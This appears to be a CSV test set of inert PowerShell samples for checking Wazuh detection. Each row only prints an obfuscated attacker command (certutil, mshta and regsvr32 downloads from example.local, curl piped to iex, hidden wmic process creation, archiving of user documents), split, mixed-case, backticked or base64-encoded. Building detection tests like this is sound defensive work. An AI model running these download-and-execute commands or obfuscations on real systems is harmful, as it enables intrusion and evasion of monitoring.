id,label,class_id,source_family,source_reference_url,tactic,technique,scenario,obfuscation_type,execution_behavior,safety_class,scriptblock,expected_signal,safety_notes
OBF-072,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Collection,T1560,compress_archive_collection_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-072'; $indicator = 'Compress-Archive -Path ''$env:USERPROFILE\Documents\*.txt'' -DestinationPath ''$env:TEMP\archive.zip'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-073,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1047,process_create_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-073'; $parts = @('wmic process ', 'call create ''', 'powershell -N', 'oProfile -Win', 'dowStyle Hidd', 'en <placehold', 'er>'''); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-074,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1047,process_create_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-074'; $indicator = 'WmIc PrOcEsS cAlL cReAtE ''pOwErShElL -nOpRoFiLe -WiNdOwStYlE hIdDeN <pLaCeHoLdEr>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-075,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1047,process_create_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-075'; $encoded = 'dwBtAGkAYwAgAHAAcgBvAGMAZQBzAHMAIABjAGEAbABsACAAYwByAGUAYQB0AGUAIAAnAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgADwAcABsAGEAYwBlAGgAbwBsAGQAZQByAD4AJwA='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-076,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1047,process_create_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-076'; $indicator = 'wmic process call create ''power`shell -NoProfile -WindowStyle Hidden <placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-077,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,LOLBAS,certutil_lolbin_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-077'; $parts = @('certutil.ex', 'e -urlcache', ' -split -f ', 'http://exam', 'ple.local/f', 'ile.txt fil', 'e.txt'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-078,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,LOLBAS,certutil_lolbin_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-078'; $indicator = 'CeRtUtIl.ExE -uRlCaChE -sPlIt -F hTtP://eXaMpLe.LoCaL/fIlE.tXt FiLe.TxT'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-079,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,LOLBAS,certutil_lolbin_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-079'; $encoded = 'YwBlAHIAdAB1AHQAaQBsAC4AZQB4AGUAIAAtAHUAcgBsAGMAYQBjAGgAZQAgAC0AcwBwAGwAaQB0ACAALQBmACAAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AbABvAGMAYQBsAC8AZgBpAGwAZQAuAHQAeAB0ACAAZgBpAGwAZQAuAHQAeAB0AA=='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-080,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,LOLBAS,certutil_lolbin_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-080'; $indicator = 'certutil.exe -urlcache -split -f http://example.local/file.txt file.txt'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-081,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,mshta_lolbin_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-081'; $parts = @('mshta.', 'exe ht', 'tp://e', 'xample', '.local', '/test.', 'hta'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-082,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,mshta_lolbin_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-082'; $indicator = 'MsHtA.eXe HtTp://ExAmPlE.lOcAl/TeSt.HtA'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-083,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,mshta_lolbin_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-083'; $encoded = 'bQBzAGgAdABhAC4AZQB4AGUAIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBsAG8AYwBhAGwALwB0AGUAcwB0AC4AaAB0AGEA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-084,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,mshta_lolbin_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-084'; $indicator = 'mshta.exe http://example.local/test.hta'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-085,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,regsvr32_lolbin_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-085'; $parts = @('regsvr32.ex', 'e /s /n /u ', '/i:http://e', 'xample.loca', 'l/scrobj.sc', 't scrobj.dl', 'l'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-086,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,regsvr32_lolbin_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-086'; $indicator = 'ReGsVr32.ExE /s /N /u /I:hTtP://eXaMpLe.LoCaL/sCrObJ.sCt ScRoBj.DlL'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-087,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,regsvr32_lolbin_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-087'; $encoded = 'cgBlAGcAcwB2AHIAMwAyAC4AZQB4AGUAIAAvAHMAIAAvAG4AIAAvAHUAIAAvAGkAOgBoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBsAG8AYwBhAGwALwBzAGMAcgBvAGIAagAuAHMAYwB0ACAAcwBjAHIAbwBiAGoALgBkAGwAbAA='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-088,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,regsvr32_lolbin_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-088'; $indicator = 'regsvr32.exe /s /n /u /i:http://example.local/scrobj.sct scrobj.dll'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-089,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,rundll32_lolbin_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-089'; $parts = @('rundll', '32.exe', ' javas', 'cript:', '''<plac', 'eholde', 'r>'''); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-090,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,rundll32_lolbin_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-090'; $indicator = 'RuNdLl32.ExE jAvAsCrIpT:''<pLaCeHoLdEr>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-091,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,rundll32_lolbin_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-091'; $encoded = 'cgB1AG4AZABsAGwAMwAyAC4AZQB4AGUAIABqAGEAdgBhAHMAYwByAGkAcAB0ADoAJwA8AHAAbABhAGMAZQBoAG8AbABkAGUAcgA+ACcA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-092,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,LOLBAS,rundll32_lolbin_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-092'; $indicator = 'rundll32.exe javascript:''<placeholder>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-093,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,installutil_lolbin_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-093'; $parts = @('Install', 'Util.ex', 'e <plac', 'eholder', ' assemb', 'ly path', '>'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-094,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,installutil_lolbin_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-094'; $indicator = 'InStAlLuTiL.eXe <PlAcEhOlDeR aSsEmBlY pAtH>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-095,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,installutil_lolbin_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-095'; $encoded = 'SQBuAHMAdABhAGwAbABVAHQAaQBsAC4AZQB4AGUAIAA8AHAAbABhAGMAZQBoAG8AbABkAGUAcgAgAGEAcwBzAGUAbQBiAGwAeQAgAHAAYQB0AGgAPgA='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-096,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,installutil_lolbin_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-096'; $indicator = 'InstallUtil.exe <placeholder assembly path>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-097,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,msbuild_lolbin_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-097'; $parts = @('MSBuil', 'd.exe ', '<place', 'holder', ' proje', 'ct fil', 'e>'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-098,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,msbuild_lolbin_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-098'; $indicator = 'MsBuIlD.eXe <PlAcEhOlDeR pRoJeCt FiLe>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-099,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,msbuild_lolbin_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-099'; $encoded = 'TQBTAEIAdQBpAGwAZAAuAGUAeABlACAAPABwAGwAYQBjAGUAaABvAGwAZABlAHIAIABwAHIAbwBqAGUAYwB0ACAAZgBpAGwAZQA+AA=='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-100,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Defense Evasion,LOLBAS,msbuild_lolbin_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-100'; $indicator = 'MSBuild.exe <placeholder project file>'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-101,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Persistence,T1546,powershell_profile_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-101'; $parts = @('$PROFILE ', 'CurrentUs', 'erAllHost', 's startup', ' script p', 'laceholde', 'r'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-102,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Persistence,T1546,powershell_profile_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-102'; $indicator = '$PrOfIlE cUrReNtUsErAlLhOsTs StArTuP sCrIpT pLaCeHoLdEr'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-103,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Persistence,T1546,powershell_profile_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-103'; $encoded = 'JABQAFIATwBGAEkATABFACAAQwB1AHIAcgBlAG4AdABVAHMAZQByAEEAbABsAEgAbwBzAHQAcwAgAHMAdABhAHIAdAB1AHAAIABzAGMAcgBpAHAAdAAgAHAAbABhAGMAZQBoAG8AbABkAGUAcgA='; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-104,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Persistence,T1546,powershell_profile_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-104'; $indicator = '$PROFILE CurrentUserAllHosts startup script placeholder'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-105,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_expression_alias_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-105'; $parts = @('iex ''', '<plac', 'ehold', 'er ex', 'press', 'ion>'''); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-106,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_expression_alias_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-106'; $indicator = 'IeX ''<pLaCeHoLdEr ExPrEsSiOn>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-107,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_expression_alias_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-107'; $encoded = 'aQBlAHgAIAAnADwAcABsAGEAYwBlAGgAbwBsAGQAZQByACAAZQB4AHAAcgBlAHMAcwBpAG8AbgA+ACcA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-108,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,invoke_expression_alias_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-108'; $indicator = 'iex ''<placeholder expression>'''; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-109,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,invoke_webrequest_alias_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-109'; $parts = @('iwr ''htt', 'p://exam', 'ple.loca', 'l/test'' ', '-UseBasi', 'cParsing'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-110,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,invoke_webrequest_alias_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-110'; $indicator = 'IwR ''hTtP://eXaMpLe.LoCaL/tEsT'' -uSeBaSiCpArSiNg'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-111,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,invoke_webrequest_alias_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-111'; $encoded = 'aQB3AHIAIAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGwAbwBjAGEAbAAvAHQAZQBzAHQAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-112,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Command and Control,T1059.001,invoke_webrequest_alias_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-112'; $indicator = 'iwr ''http://example.local/test'' -UseBasicParsing'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-113,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,curl_alias_marker_string_concatenation,string_concatenation,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-113'; $parts = @('curl ''h', 'ttp://e', 'xample.', 'local/t', 'est.ps1', ''' | iex'); $indicator = ($parts -join ''); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-114,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,curl_alias_marker_mixed_case,mixed_case,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-114'; $indicator = 'CuRl ''HtTp://ExAmPlE.lOcAl/TeSt.Ps1'' | IeX'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-115,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,curl_alias_marker_base64_literal_decode_safe,base64_literal_decode_safe,safe_obfuscated_indicator,safe_decode_only,"$sampleId = 'OBF-115'; $encoded = 'YwB1AHIAbAAgACcAaAB0AHQAcAA6AC8ALwBlAHgAYQBtAHAAbABlAC4AbABvAGMAYQBsAC8AdABlAHMAdAAuAHAAcwAxACcAIAB8ACAAaQBlAHgA'; $indicator = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
OBF-116,simulated_malicious,1,Invoke-Obfuscation,https://github.com/danielbohannon/Invoke-Obfuscation,Execution,T1059.001,curl_alias_marker_backtick_literal,backtick_literal,safe_obfuscated_indicator,inert_string_telemetry,"$sampleId = 'OBF-116'; $indicator = 'curl ''http://example.local/test.ps1'' | iex'; Write-Output (""WAZUH_SAMPLE {0} {1}"" -f $sampleId, $indicator)",obfuscation_may_reduce_rule_match_or_trigger_lexical_features,Obfuscated indicator is safe; it is not executed as a real command.
